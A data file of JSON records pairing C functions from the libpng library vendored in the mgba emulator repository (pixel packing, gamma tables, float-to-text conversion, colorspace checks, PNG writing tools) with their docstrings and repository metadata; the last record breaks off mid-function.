{"docstring": "/* Pack pixels into bytes.  Pass the true bit depth in bit_depth.  The\n * row_info bit depth should be 8 (one pixel per byte).  The channels\n * should be 1 (this only happens on grayscale and paletted images).\n */\n", "func_signal": "static void\npng_do_pack(png_row_infop row_info, png_bytep row, png_uint_32 bit_depth)", "code": "{\n   png_debug(1, \"in png_do_pack\");\n\n   if (row_info->bit_depth == 8 &&\n      row_info->channels == 1)\n   {\n      switch ((int)bit_depth)\n      {\n         case 1:\n         {\n            png_bytep sp, dp;\n            int mask, v;\n            png_uint_32 i;\n            png_uint_32 row_width = row_info->width;\n\n            sp = row;\n            dp = row;\n            mask = 0x80;\n            v = 0;\n\n            for (i = 0; i < row_width; i++)\n            {\n               if (*sp != 0)\n                  v |= mask;\n\n               sp++;\n\n               if (mask > 1)\n                  mask >>= 1;\n\n               else\n               {\n                  mask = 0x80;\n                  *dp = (png_byte)v;\n                  dp++;\n                  v = 0;\n               }\n            }\n\n            if (mask != 0x80)\n               *dp = (png_byte)v;\n\n            break;\n         }\n\n         case 2:\n         {\n            png_bytep sp, dp;\n            unsigned int shift;\n            int v;\n            png_uint_32 i;\n            png_uint_32 row_width = row_info->width;\n\n            sp = row;\n            dp = row;\n            shift = 6;\n            v = 0;\n\n            for (i = 0; i < row_width; i++)\n            {\n               png_byte value;\n\n               value = (png_byte)(*sp & 0x03);\n               v |= (value << shift);\n\n               if (shift == 0)\n               {\n                  shift = 6;\n                  *dp = (png_byte)v;\n                  dp++;\n                  v = 0;\n               }\n\n               else\n                  shift -= 2;\n\n               sp++;\n            }\n\n            if (shift != 6)\n               *dp = (png_byte)v;\n\n            break;\n         }\n\n         case 4:\n         {\n            png_bytep sp, dp;\n            unsigned int shift;\n            int v;\n            png_uint_32 i;\n            png_uint_32 row_width = row_info->width;\n\n            sp = row;\n            dp = row;\n            shift = 4;\n            v = 0;\n\n            for (i = 0; i < row_width; i++)\n            {\n               png_byte value;\n\n               value = (png_byte)(*sp & 0x0f);\n               v |= (value << shift);\n\n               if (shift == 0)\n               {\n                  shift = 4;\n                  *dp = (png_byte)v;\n                  dp++;\n                  v = 0;\n               }\n\n               else\n                  shift -= 4;\n\n               sp++;\n            }\n\n            if (shift != 4)\n               *dp = (png_byte)v;\n\n            break;\n         }\n\n         default:\n            break;\n      }\n\n      row_info->bit_depth = (png_byte)bit_depth;\n      row_info->pixel_depth = (png_byte)(bit_depth * row_info->channels);\n      row_info->rowbytes = PNG_ROWBYTES(row_info->pixel_depth,\n          row_info->width);\n   }\n}", "path": "mgba/src/third-party/libpng/pngwtran.c", "commit_date": "2018-09-11 00:00:00", "repo_name": "mgba-emu/mgba", "stars": 5146, "license": "mpl-2.0", "language": "c", "size": 50982}
{"docstring": "/* NOTE: this function expects the *inverse* of the overall gamma transformation\n * required.\n */\n", "func_signal": "static void\npng_build_16to8_table(png_structrp png_ptr, png_uint_16pp *ptable,\n    PNG_CONST unsigned int shift, PNG_CONST png_fixed_point gamma_val)", "code": "{\n   PNG_CONST unsigned int num = 1U << (8U - shift);\n   PNG_CONST unsigned int max = (1U << (16U - shift))-1U;\n   unsigned int i;\n   png_uint_32 last;\n\n   png_uint_16pp table = *ptable =\n       (png_uint_16pp)png_calloc(png_ptr, num * (sizeof (png_uint_16p)));\n\n   /* 'num' is the number of tables and also the number of low bits of low\n    * bits of the input 16-bit value used to select a table.  Each table is\n    * itself indexed by the high 8 bits of the value.\n    */\n   for (i = 0; i < num; i++)\n      table[i] = (png_uint_16p)png_malloc(png_ptr,\n          256 * (sizeof (png_uint_16)));\n\n   /* 'gamma_val' is set to the reciprocal of the value calculated above, so\n    * pow(out,g) is an *input* value.  'last' is the last input value set.\n    *\n    * In the loop 'i' is used to find output values.  Since the output is\n    * 8-bit there are only 256 possible values.  The tables are set up to\n    * select the closest possible output value for each input by finding\n    * the input value at the boundary between each pair of output values\n    * and filling the table up to that boundary with the lower output\n    * value.\n    *\n    * The boundary values are 0.5,1.5..253.5,254.5.  Since these are 9-bit\n    * values the code below uses a 16-bit value in i; the values start at\n    * 128.5 (for 0.5) and step by 257, for a total of 254 values (the last\n    * entries are filled with 255).  Start i at 128 and fill all 'last'\n    * table entries <= 'max'\n    */\n   last = 0;\n   for (i = 0; i < 255; ++i) /* 8-bit output value */\n   {\n      /* Find the corresponding maximum input value */\n      png_uint_16 out = (png_uint_16)(i * 257U); /* 16-bit output value */\n\n      /* Find the boundary value in 16 bits: */\n      png_uint_32 bound = png_gamma_16bit_correct(out+128U, gamma_val);\n\n      /* Adjust (round) to (16-shift) bits: */\n      bound = (bound * max + 32768U)/65535U + 1U;\n\n      while (last < bound)\n      {\n         table[last & (0xffU >> shift)][last >> (8U - shift)] = out;\n         last++;\n      }\n   }\n\n   /* And fill in the final entries. */\n   while (last < (num << 8))\n   {\n      table[last & (0xff >> shift)][last >> (8U - shift)] = 65535U;\n      last++;\n   }\n}", "path": "mgba/src/third-party/libpng/png.c", "commit_date": "2018-09-11 00:00:00", "repo_name": "mgba-emu/mgba", "stars": 5146, "license": "mpl-2.0", "language": "c", "size": 50982}
{"docstring": "/* Internal function to build a single 16-bit table - the table consists of\n * 'num' 256 entry subtables, where 'num' is determined by 'shift' - the amount\n * to shift the input values right (or 16-number_of_signifiant_bits).\n *\n * The caller is responsible for ensuring that the table gets cleaned up on\n * png_error (i.e. if one of the mallocs below fails) - i.e. the *table argument\n * should be somewhere that will be cleaned.\n */\n", "func_signal": "static void\npng_build_16bit_table(png_structrp png_ptr, png_uint_16pp *ptable,\n    PNG_CONST unsigned int shift, PNG_CONST png_fixed_point gamma_val)", "code": "{\n   /* Various values derived from 'shift': */\n   PNG_CONST unsigned int num = 1U << (8U - shift);\n#ifdef PNG_FLOATING_ARITHMETIC_SUPPORTED\n   /* CSE the division and work round wacky GCC warnings (see the comments\n    * in png_gamma_8bit_correct for where these come from.)\n    */\n   PNG_CONST double fmax = 1./(((png_int_32)1 << (16U - shift))-1);\n#endif\n   PNG_CONST unsigned int max = (1U << (16U - shift))-1U;\n   PNG_CONST unsigned int max_by_2 = 1U << (15U-shift);\n   unsigned int i;\n\n   png_uint_16pp table = *ptable =\n       (png_uint_16pp)png_calloc(png_ptr, num * (sizeof (png_uint_16p)));\n\n   for (i = 0; i < num; i++)\n   {\n      png_uint_16p sub_table = table[i] =\n          (png_uint_16p)png_malloc(png_ptr, 256 * (sizeof (png_uint_16)));\n\n      /* The 'threshold' test is repeated here because it can arise for one of\n       * the 16-bit tables even if the others don't hit it.\n       */\n      if (png_gamma_significant(gamma_val) != 0)\n      {\n         /* The old code would overflow at the end and this would cause the\n          * 'pow' function to return a result >1, resulting in an\n          * arithmetic error.  This code follows the spec exactly; ig is\n          * the recovered input sample, it always has 8-16 bits.\n          *\n          * We want input * 65535/max, rounded, the arithmetic fits in 32\n          * bits (unsigned) so long as max <= 32767.\n          */\n         unsigned int j;\n         for (j = 0; j < 256; j++)\n         {\n            png_uint_32 ig = (j << (8-shift)) + i;\n#           ifdef PNG_FLOATING_ARITHMETIC_SUPPORTED\n               /* Inline the 'max' scaling operation: */\n               /* See png_gamma_8bit_correct for why the cast to (int) is\n                * required here.\n                */\n               double d = floor(65535.*pow(ig*fmax, gamma_val*.00001)+.5);\n               sub_table[j] = (png_uint_16)d;\n#           else\n               if (shift != 0)\n                  ig = (ig * 65535U + max_by_2)/max;\n\n               sub_table[j] = png_gamma_16bit_correct(ig, gamma_val);\n#           endif\n         }\n      }\n      else\n      {\n         /* We must still build a table, but do it the fast way. */\n         unsigned int j;\n\n         for (j = 0; j < 256; j++)\n         {\n            png_uint_32 ig = (j << (8-shift)) + i;\n\n            if (shift != 0)\n               ig = (ig * 65535U + max_by_2)/max;\n\n            sub_table[j] = (png_uint_16)ig;\n         }\n      }\n   }\n}", "path": "mgba/src/third-party/libpng/png.c", "commit_date": "2018-09-11 00:00:00", "repo_name": "mgba-emu/mgba", "stars": 5146, "license": "mpl-2.0", "language": "c", "size": 50982}
{"docstring": "/* PRIVATE */\n", "func_signal": "png_ascii_from_fp(png_const_structrp png_ptr, png_charp ascii, png_size_t size,\n    double fp, unsigned int precision)", "code": "{\n   /* We use standard functions from math.h, but not printf because\n    * that would require stdio.  The caller must supply a buffer of\n    * sufficient size or we will png_error.  The tests on size and\n    * the space in ascii[] consumed are indicated below.\n    */\n   if (precision < 1)\n      precision = DBL_DIG;\n\n   /* Enforce the limit of the implementation precision too. */\n   if (precision > DBL_DIG+1)\n      precision = DBL_DIG+1;\n\n   /* Basic sanity checks */\n   if (size >= precision+5) /* See the requirements below. */\n   {\n      if (fp < 0)\n      {\n         fp = -fp;\n         *ascii++ = 45; /* '-'  PLUS 1 TOTAL 1 */\n         --size;\n      }\n\n      if (fp >= DBL_MIN && fp <= DBL_MAX)\n      {\n         int exp_b10;   /* A base 10 exponent */\n         double base;   /* 10^exp_b10 */\n\n         /* First extract a base 10 exponent of the number,\n          * the calculation below rounds down when converting\n          * from base 2 to base 10 (multiply by log10(2) -\n          * 0.3010, but 77/256 is 0.3008, so exp_b10 needs to\n          * be increased.  Note that the arithmetic shift\n          * performs a floor() unlike C arithmetic - using a\n          * C multiply would break the following for negative\n          * exponents.\n          */\n         (void)frexp(fp, &exp_b10); /* exponent to base 2 */\n\n         exp_b10 = (exp_b10 * 77) >> 8; /* <= exponent to base 10 */\n\n         /* Avoid underflow here. */\n         base = png_pow10(exp_b10); /* May underflow */\n\n         while (base < DBL_MIN || base < fp)\n         {\n            /* And this may overflow. */\n            double test = png_pow10(exp_b10+1);\n\n            if (test <= DBL_MAX)\n            {\n               ++exp_b10; base = test;\n            }\n\n            else\n               break;\n         }\n\n         /* Normalize fp and correct exp_b10, after this fp is in the\n          * range [.1,1) and exp_b10 is both the exponent and the digit\n          * *before* which the decimal point should be inserted\n          * (starting with 0 for the first digit).  Note that this\n          * works even if 10^exp_b10 is out of range because of the\n          * test on DBL_MAX above.\n          */\n         fp /= base;\n         while (fp >= 1)\n         {\n            fp /= 10; ++exp_b10;\n         }\n\n         /* Because of the code above fp may, at this point, be\n          * less than .1, this is ok because the code below can\n          * handle the leading zeros this generates, so no attempt\n          * is made to correct that here.\n          */\n\n         {\n            unsigned int czero, clead, cdigits;\n            char exponent[10];\n\n            /* Allow up to two leading zeros - this will not lengthen\n             * the number compared to using E-n.\n             */\n            if (exp_b10 < 0 && exp_b10 > -3) /* PLUS 3 TOTAL 4 */\n            {\n               czero = 0U-exp_b10; /* PLUS 2 digits: TOTAL 3 */\n               exp_b10 = 0;      /* Dot added below before first output. */\n            }\n            else\n               czero = 0;    /* No zeros to add */\n\n            /* Generate the digit list, stripping trailing zeros and\n             * inserting a '.' before a digit if the exponent is 0.\n             */\n            clead = czero; /* Count of leading zeros */\n            cdigits = 0;   /* Count of digits in list. */\n\n            do\n            {\n               double d;\n\n               fp *= 10;\n               /* Use modf here, not floor and subtract, so that\n                * the separation is done in one step.  At the end\n                * of the loop don't break the number into parts so\n                * that the final digit is rounded.\n                */\n               if (cdigits+czero+1 < precision+clead)\n                  fp = modf(fp, &d);\n\n               else\n               {\n                  d = floor(fp + .5);\n\n                  if (d > 9)\n                  {\n                     /* Rounding up to 10, handle that here. */\n                     if (czero > 0)\n                     {\n                        --czero; d = 1;\n                        if (cdigits == 0) --clead;\n                     }\n                     else\n                     {\n                        while (cdigits > 0 && d > 9)\n                        {\n                           int ch = *--ascii;\n\n                           if (exp_b10 != (-1))\n                              ++exp_b10;\n\n                           else if (ch == 46)\n                           {\n                              ch = *--ascii; ++size;\n                              /* Advance exp_b10 to '1', so that the\n                               * decimal point happens after the\n                               * previous digit.\n                               */\n                              exp_b10 = 1;\n                           }\n\n                           --cdigits;\n                           d = ch - 47;  /* I.e. 1+(ch-48) */\n                        }\n\n                        /* Did we reach the beginning? If so adjust the\n                         * exponent but take into account the leading\n                         * decimal point.\n                         */\n                        if (d > 9)  /* cdigits == 0 */\n                        {\n                           if (exp_b10 == (-1))\n                           {\n                              /* Leading decimal point (plus zeros?), if\n                               * we lose the decimal point here it must\n                               * be reentered below.\n                               */\n                              int ch = *--ascii;\n\n                              if (ch == 46)\n                              {\n                                 ++size; exp_b10 = 1;\n                              }\n\n                              /* Else lost a leading zero, so 'exp_b10' is\n                               * still ok at (-1)\n                               */\n                           }\n                           else\n                              ++exp_b10;\n\n                           /* In all cases we output a '1' */\n                           d = 1;\n                        }\n                     }\n                  }\n                  fp = 0; /* Guarantees termination below. */\n               }\n\n               if (d == 0)\n               {\n                  ++czero;\n                  if (cdigits == 0) ++clead;\n               }\n               else\n               {\n                  /* Included embedded zeros in the digit count. */\n                  cdigits += czero - clead;\n                  clead = 0;\n\n                  while (czero > 0)\n                  {\n                     /* exp_b10 == (-1) means we just output the decimal\n                      * place - after the DP don't adjust 'exp_b10' any\n                      * more!\n                      */\n                     if (exp_b10 != (-1))\n                     {\n                        if (exp_b10 == 0)\n                        {\n                           *ascii++ = 46; --size;\n                        }\n                        /* PLUS 1: TOTAL 4 */\n                        --exp_b10;\n                     }\n                     *ascii++ = 48; --czero;\n                  }\n\n                  if (exp_b10 != (-1))\n                  {\n                     if (exp_b10 == 0)\n                     {\n                        *ascii++ = 46; --size; /* counted above */\n                     }\n\n                     --exp_b10;\n                  }\n                  *ascii++ = (char)(48 + (int)d); ++cdigits;\n               }\n            }\n            while (cdigits+czero < precision+clead && fp > DBL_MIN);\n\n            /* The total output count (max) is now 4+precision */\n\n            /* Check for an exponent, if we don't need one we are\n             * done and just need to terminate the string.  At\n             * this point exp_b10==(-1) is effectively a flag - it got\n             * to '-1' because of the decrement after outputting\n             * the decimal point above (the exponent required is\n             * *not* -1!)\n             */\n            if (exp_b10 >= (-1) && exp_b10 <= 2)\n            {\n               /* The following only happens if we didn't output the\n                * leading zeros above for negative exponent, so this\n                * doesn't add to the digit requirement.  Note that the\n                * two zeros here can only be output if the two leading\n                * zeros were *not* output, so this doesn't increase\n                * the output count.\n                */\n               while (exp_b10-- > 0) *ascii++ = 48;\n\n               *ascii = 0;\n\n               /* Total buffer requirement (including the '\\0') is\n                * 5+precision - see check at the start.\n                */\n               return;\n            }\n\n            /* Here if an exponent is required, adjust size for\n             * the digits we output but did not count.  The total\n             * digit output here so far is at most 1+precision - no\n             * decimal point and no leading or trailing zeros have\n             * been output.\n             */\n            size -= cdigits;\n\n            *ascii++ = 69; --size;    /* 'E': PLUS 1 TOTAL 2+precision */\n\n            /* The following use of an unsigned temporary avoids ambiguities in\n             * the signed arithmetic on exp_b10 and permits GCC at least to do\n             * better optimization.\n             */\n            {\n               unsigned int uexp_b10;\n\n               if (exp_b10 < 0)\n               {\n                  *ascii++ = 45; --size; /* '-': PLUS 1 TOTAL 3+precision */\n                  uexp_b10 = 0U-exp_b10;\n               }\n\n               else\n                  uexp_b10 = 0U+exp_b10;\n\n               cdigits = 0;\n\n               while (uexp_b10 > 0)\n               {\n                  exponent[cdigits++] = (char)(48 + uexp_b10 % 10);\n                  uexp_b10 /= 10;\n               }\n            }\n\n            /* Need another size check here for the exponent digits, so\n             * this need not be considered above.\n             */\n            if (size > cdigits)\n            {\n               while (cdigits > 0) *ascii++ = exponent[--cdigits];\n\n               *ascii = 0;\n\n               return;\n            }\n         }\n      }\n      else if (!(fp >= DBL_MIN))\n      {\n         *ascii++ = 48; /* '0' */\n         *ascii = 0;\n         return;\n      }\n      else\n      {\n         *ascii++ = 105; /* 'i' */\n         *ascii++ = 110; /* 'n' */\n         *ascii++ = 102; /* 'f' */\n         *ascii = 0;\n         return;\n      }\n   }\n\n   /* Here on buffer too small. */\n   png_error(png_ptr, \"ASCII conversion buffer too small\");\n}", "path": "mgba/src/third-party/libpng/png.c", "commit_date": "2018-09-11 00:00:00", "repo_name": "mgba-emu/mgba", "stars": 5146, "license": "mpl-2.0", "language": "c", "size": 50982}
{"docstring": "/* PRIVATE */\n", "func_signal": "png_destroy_gamma_table(png_structrp png_ptr)", "code": "{\n   png_free(png_ptr, png_ptr->gamma_table);\n   png_ptr->gamma_table = NULL;\n\n#ifdef PNG_16BIT_SUPPORTED\n   if (png_ptr->gamma_16_table != NULL)\n   {\n      int i;\n      int istop = (1 << (8 - png_ptr->gamma_shift));\n      for (i = 0; i < istop; i++)\n      {\n         png_free(png_ptr, png_ptr->gamma_16_table[i]);\n      }\n   png_free(png_ptr, png_ptr->gamma_16_table);\n   png_ptr->gamma_16_table = NULL;\n   }\n#endif /* 16BIT */\n\n#if defined(PNG_READ_BACKGROUND_SUPPORTED) || \\\n   defined(PNG_READ_ALPHA_MODE_SUPPORTED) || \\\n   defined(PNG_READ_RGB_TO_GRAY_SUPPORTED)\n   png_free(png_ptr, png_ptr->gamma_from_1);\n   png_ptr->gamma_from_1 = NULL;\n   png_free(png_ptr, png_ptr->gamma_to_1);\n   png_ptr->gamma_to_1 = NULL;\n\n#ifdef PNG_16BIT_SUPPORTED\n   if (png_ptr->gamma_16_from_1 != NULL)\n   {\n      int i;\n      int istop = (1 << (8 - png_ptr->gamma_shift));\n      for (i = 0; i < istop; i++)\n      {\n         png_free(png_ptr, png_ptr->gamma_16_from_1[i]);\n      }\n   png_free(png_ptr, png_ptr->gamma_16_from_1);\n   png_ptr->gamma_16_from_1 = NULL;\n   }\n   if (png_ptr->gamma_16_to_1 != NULL)\n   {\n      int i;\n      int istop = (1 << (8 - png_ptr->gamma_shift));\n      for (i = 0; i < istop; i++)\n      {\n         png_free(png_ptr, png_ptr->gamma_16_to_1[i]);\n      }\n   png_free(png_ptr, png_ptr->gamma_16_to_1);\n   png_ptr->gamma_16_to_1 = NULL;\n   }\n#endif /* 16BIT */\n#endif /* READ_BACKGROUND || READ_ALPHA_MODE || RGB_TO_GRAY */\n}", "path": "mgba/src/third-party/libpng/png.c", "commit_date": "2018-09-11 00:00:00", "repo_name": "mgba-emu/mgba", "stars": 5146, "license": "mpl-2.0", "language": "c", "size": 50982}
{"docstring": "/* Error message generation */\n", "func_signal": "static char\npng_icc_tag_char(png_uint_32 byte)", "code": "{\n   byte &= 0xff;\n   if (byte >= 32 && byte <= 126)\n      return (char)byte;\n   else\n      return '?';\n}", "path": "mgba/src/third-party/libpng/png.c", "commit_date": "2018-09-11 00:00:00", "repo_name": "mgba-emu/mgba", "stars": 5146, "license": "mpl-2.0", "language": "c", "size": 50982}
{"docstring": "/* Check a user supplied version number, called from both read and write\n * functions that create a png_struct.\n */\n", "func_signal": "int\npng_user_version_check(png_structrp png_ptr, png_const_charp user_png_ver)", "code": "{\n   /* Libpng versions 1.0.0 and later are binary compatible if the version\n    * string matches through the second '.'; we must recompile any\n    * applications that use any older library version.\n    */\n\n   if (user_png_ver != NULL)\n   {\n      int i = -1;\n      int found_dots = 0;\n\n      do\n      {\n         i++;\n         if (user_png_ver[i] != PNG_LIBPNG_VER_STRING[i])\n            png_ptr->flags |= PNG_FLAG_LIBRARY_MISMATCH;\n         if (user_png_ver[i] == '.')\n            found_dots++;\n      } while (found_dots < 2 && user_png_ver[i] != 0 &&\n            PNG_LIBPNG_VER_STRING[i] != 0);\n   }\n\n   else\n      png_ptr->flags |= PNG_FLAG_LIBRARY_MISMATCH;\n\n   if ((png_ptr->flags & PNG_FLAG_LIBRARY_MISMATCH) != 0)\n   {\n#ifdef PNG_WARNINGS_SUPPORTED\n      size_t pos = 0;\n      char m[128];\n\n      pos = png_safecat(m, (sizeof m), pos,\n          \"Application built with libpng-\");\n      pos = png_safecat(m, (sizeof m), pos, user_png_ver);\n      pos = png_safecat(m, (sizeof m), pos, \" but running with \");\n      pos = png_safecat(m, (sizeof m), pos, PNG_LIBPNG_VER_STRING);\n      PNG_UNUSED(pos)\n\n      png_warning(png_ptr, m);\n#endif\n\n#ifdef PNG_ERROR_NUMBERS_SUPPORTED\n      png_ptr->flags = 0;\n#endif\n\n      return 0;\n   }\n\n   /* Success return. */\n   return 1;\n}", "path": "mgba/src/third-party/libpng/png.c", "commit_date": "2018-09-11 00:00:00", "repo_name": "mgba-emu/mgba", "stars": 5146, "license": "mpl-2.0", "language": "c", "size": 50982}
{"docstring": "/* This is the check going the other way.  The XYZ is modified to normalize it\n * (another side-effect) and the xy chromaticities are returned.\n */\n", "func_signal": "static int\npng_colorspace_check_XYZ(png_xy *xy, png_XYZ *XYZ)", "code": "{\n   int result;\n   png_XYZ XYZtemp;\n\n   result = png_XYZ_normalize(XYZ);\n   if (result != 0)\n      return result;\n\n   result = png_xy_from_XYZ(xy, XYZ);\n   if (result != 0)\n      return result;\n\n   XYZtemp = *XYZ;\n   return png_colorspace_check_xy(&XYZtemp, xy);\n}", "path": "mgba/src/third-party/libpng/png.c", "commit_date": "2018-09-11 00:00:00", "repo_name": "mgba-emu/mgba", "stars": 5146, "license": "mpl-2.0", "language": "c", "size": 50982}
{"docstring": "/* PRIVATE */\n", "func_signal": "png_colorspace_set_gamma(png_const_structrp png_ptr,\n    png_colorspacerp colorspace, png_fixed_point gAMA)", "code": "{\n   /* Changed in libpng-1.5.4 to limit the values to ensure overflow can't\n    * occur.  Since the fixed point representation is asymetrical it is\n    * possible for 1/gamma to overflow the limit of 21474 and this means the\n    * gamma value must be at least 5/100000 and hence at most 20000.0.  For\n    * safety the limits here are a little narrower.  The values are 0.00016 to\n    * 6250.0, which are truly ridiculous gamma values (and will produce\n    * displays that are all black or all white.)\n    *\n    * In 1.6.0 this test replaces the ones in pngrutil.c, in the gAMA chunk\n    * handling code, which only required the value to be >0.\n    */\n   png_const_charp errmsg;\n\n   if (gAMA < 16 || gAMA > 625000000)\n      errmsg = \"gamma value out of range\";\n\n#  ifdef PNG_READ_gAMA_SUPPORTED\n   /* Allow the application to set the gamma value more than once */\n   else if ((png_ptr->mode & PNG_IS_READ_STRUCT) != 0 &&\n      (colorspace->flags & PNG_COLORSPACE_FROM_gAMA) != 0)\n      errmsg = \"duplicate\";\n#  endif\n\n   /* Do nothing if the colorspace is already invalid */\n   else if ((colorspace->flags & PNG_COLORSPACE_INVALID) != 0)\n      return;\n\n   else\n   {\n      if (png_colorspace_check_gamma(png_ptr, colorspace, gAMA,\n          1/*from gAMA*/) != 0)\n      {\n         /* Store this gamma value. */\n         colorspace->gamma = gAMA;\n         colorspace->flags |=\n            (PNG_COLORSPACE_HAVE_GAMMA | PNG_COLORSPACE_FROM_gAMA);\n      }\n\n      /* At present if the check_gamma test fails the gamma of the colorspace is\n       * not updated however the colorspace is not invalidated.  This\n       * corresponds to the case where the existing gamma comes from an sRGB\n       * chunk or profile.  An error message has already been output.\n       */\n      return;\n   }\n\n   /* Error exit - errmsg has been set. */\n   colorspace->flags |= PNG_COLORSPACE_INVALID;\n   png_chunk_report(png_ptr, errmsg, PNG_CHUNK_WRITE_ERROR);\n}", "path": "mgba/src/third-party/libpng/png.c", "commit_date": "2018-09-11 00:00:00", "repo_name": "mgba-emu/mgba", "stars": 5146, "license": "mpl-2.0", "language": "c", "size": 50982}
{"docstring": "/* PRIVATE */\n", "func_signal": "png_colorspace_sync(png_const_structrp png_ptr, png_inforp info_ptr)", "code": "{\n   if (info_ptr == NULL) /* reduce code size; check here not in the caller */\n      return;\n\n   info_ptr->colorspace = png_ptr->colorspace;\n   png_colorspace_sync_info(png_ptr, info_ptr);\n}", "path": "mgba/src/third-party/libpng/png.c", "commit_date": "2018-09-11 00:00:00", "repo_name": "mgba-emu/mgba", "stars": 5146, "license": "mpl-2.0", "language": "c", "size": 50982}
{"docstring": "/* Work out whether a path is valid (if not a display_log occurs), a directory\n * (1 is returned) or a file *or* non-existent (0 is returned).\n *\n * Used for a write path.\n */\n", "func_signal": "static int\nisdir(struct display *dp, const char *pathname)", "code": "{\n   if (pathname == NULL)\n      return 0; /* stdout */\n\n   else if (pathname[0] == 0)\n      return 1; /* empty string */\n\n   else\n   {\n      struct stat buf;\n      int ret = stat(pathname, &buf);\n\n      if (ret == 0) /* the entry exists */\n      {\n         if (S_ISDIR(buf.st_mode))\n            return 1;\n\n         /* Else expect an object that exists and can be written: */\n         if (access(pathname, W_OK) != 0)\n            display_log(dp, USER_ERROR, \"%s: cannot be written (%s)\", pathname,\n                  strerror(errno));\n\n         return 0; /* file (exists, can be written) */\n      }\n\n      else /* an error */\n      {\n         /* Non-existence is fine, other errors are not: */\n         if (errno != ENOENT)\n            display_log(dp, USER_ERROR, \"%s: invalid output name (%s)\",\n                  pathname, strerror(errno));\n\n         return 0; /* file (does not exist) */\n      }\n   }\n}", "path": "mgba/src/third-party/libpng/contrib/tools/pngcp.c", "commit_date": "2018-09-11 00:00:00", "repo_name": "mgba-emu/mgba", "stars": 5146, "license": "mpl-2.0", "language": "c", "size": 50982}
{"docstring": "/* 0 on success, else an error code */\n", "func_signal": "write_png(const char **name, FILE *fp, int color_type, int bit_depth,\n   volatile png_fixed_point gamma, chunk_insert * volatile insert,\n   unsigned int filters, unsigned int *colors, int small, int tRNS)", "code": "{\n   png_structp png_ptr = png_create_write_struct(PNG_LIBPNG_VER_STRING,\n      name, makepng_error, makepng_warning);\n   volatile png_infop info_ptr = NULL;\n   volatile png_bytep row = NULL;\n\n   if (png_ptr == NULL)\n   {\n      fprintf(stderr, \"makepng: OOM allocating write structure\\n\");\n      return 1;\n   }\n\n   if (setjmp(png_jmpbuf(png_ptr)))\n   {\n      png_structp nv_ptr = png_ptr;\n      png_infop nv_info = info_ptr;\n\n      png_ptr = NULL;\n      info_ptr = NULL;\n      png_destroy_write_struct(&nv_ptr, &nv_info);\n      if (row != NULL) free(row);\n      return 1;\n   }\n\n   /* Allow benign errors so that we can write PNGs with errors */\n   png_set_benign_errors(png_ptr, 1/*allowed*/);\n\n   /* Max out the text compression level in an attempt to make the license\n    * small.   If --small then do the same for the IDAT.\n    */\n   if (small)\n      png_set_compression_level(png_ptr, Z_BEST_COMPRESSION);\n\n   png_set_text_compression_level(png_ptr, Z_BEST_COMPRESSION);\n\n   png_init_io(png_ptr, fp);\n\n   info_ptr = png_create_info_struct(png_ptr);\n   if (info_ptr == NULL)\n      png_error(png_ptr, \"OOM allocating info structure\");\n\n   {\n      const unsigned int size =\n         image_size_of_type(color_type, bit_depth, colors, small);\n      unsigned int ysize;\n      png_fixed_point real_gamma = 45455; /* For sRGB */\n      png_byte gamma_table[256];\n      double conv;\n\n      /* Normally images are square, but with 'small' we want to simply generate\n       * all the pixel values, or all that we reasonably can:\n       */\n      if (small)\n      {\n         const unsigned int pixel_depth =\n            pixel_depth_of_type(color_type, bit_depth);\n\n         if (pixel_depth <= 8U)\n         {\n            assert(size == (1U<<pixel_depth));\n            ysize = 1U;\n         }\n\n         else\n         {\n            assert(size == 256U);\n            ysize = 256U;\n         }\n      }\n\n      else\n         ysize = size;\n\n      /* This function uses the libpng values used on read to carry extra\n       * information about the gamma:\n       */\n      if (gamma == PNG_GAMMA_MAC_18)\n         gamma = 65909;\n\n      else if (gamma > 0 && gamma < 1000)\n         gamma = PNG_FP_1;\n\n      if (gamma > 0)\n         real_gamma = gamma;\n\n      {\n         unsigned int i;\n\n         if (real_gamma == 45455) for (i=0; i<256; ++i)\n         {\n            gamma_table[i] = (png_byte)i;\n            conv = 1.;\n         }\n\n         else\n         {\n            /* Convert 'i' from sRGB (45455) to real_gamma, this makes\n             * the images look the same regardless of the gAMA chunk.\n             */\n            conv = real_gamma;\n            conv /= 45455;\n\n            gamma_table[0] = 0;\n\n            for (i=1; i<255; ++i)\n               gamma_table[i] = floorb(pow(i/255.,conv) * 255 + .5);\n\n            gamma_table[255] = 255;\n         }\n      }\n\n      png_set_IHDR(png_ptr, info_ptr, size, ysize, bit_depth, color_type,\n         PNG_INTERLACE_NONE, PNG_COMPRESSION_TYPE_BASE, PNG_FILTER_TYPE_BASE);\n\n      if (color_type & PNG_COLOR_MASK_PALETTE)\n      {\n         int npalette;\n         png_color palette[256];\n         png_byte trans[256];\n\n         npalette = generate_palette(palette, trans, bit_depth, gamma_table,\n            colors);\n         png_set_PLTE(png_ptr, info_ptr, palette, npalette);\n\n         if (tRNS)\n            png_set_tRNS(png_ptr, info_ptr, trans, npalette-1,\n               NULL/*transparent color*/);\n\n         /* Reset gamma_table to prevent the image rows being changed */\n         for (npalette=0; npalette<256; ++npalette)\n            gamma_table[npalette] = (png_byte)npalette;\n      }\n\n      else if (tRNS)\n      {\n         png_color_16 col;\n\n         col.red = col.green = col.blue = col.gray =\n            0x0101U & ((1U<<bit_depth)-1U);\n         col.index = 0U;\n         png_set_tRNS(png_ptr, info_ptr, NULL/*trans*/, 1U, &col);\n      }\n\n      if (gamma == PNG_DEFAULT_sRGB)\n         png_set_sRGB(png_ptr, info_ptr, PNG_sRGB_INTENT_ABSOLUTE);\n\n      else if (gamma > 0) /* Else don't set color space information */\n      {\n         png_set_gAMA_fixed(png_ptr, info_ptr, real_gamma);\n\n         /* Just use the sRGB values here. */\n         png_set_cHRM_fixed(png_ptr, info_ptr,\n            /* color      x       y */\n            /* white */ 31270, 32900,\n            /* red   */ 64000, 33000,\n            /* green */ 30000, 60000,\n            /* blue  */ 15000,  6000\n         );\n      }\n\n      /* Insert extra information. */\n      while (insert != NULL)\n      {\n         insert->insert(png_ptr, info_ptr, insert->nparams, insert->parameters);\n         insert = insert->next;\n      }\n\n      /* Write the file header. */\n      png_write_info(png_ptr, info_ptr);\n\n      /* Restrict the filters */\n      png_set_filter(png_ptr, PNG_FILTER_TYPE_BASE, filters);\n\n      {\n#        ifdef PNG_WRITE_INTERLACING_SUPPORTED\n            int passes = png_set_interlace_handling(png_ptr);\n#        else /* !WRITE_INTERLACING */\n            int passes = 1;\n#        endif /* !WRITE_INTERLACING */\n         int pass;\n         png_size_t rowbytes = png_get_rowbytes(png_ptr, info_ptr);\n\n         row = malloc(rowbytes);\n\n         if (row == NULL)\n            png_error(png_ptr, \"OOM allocating row buffer\");\n\n         for (pass = 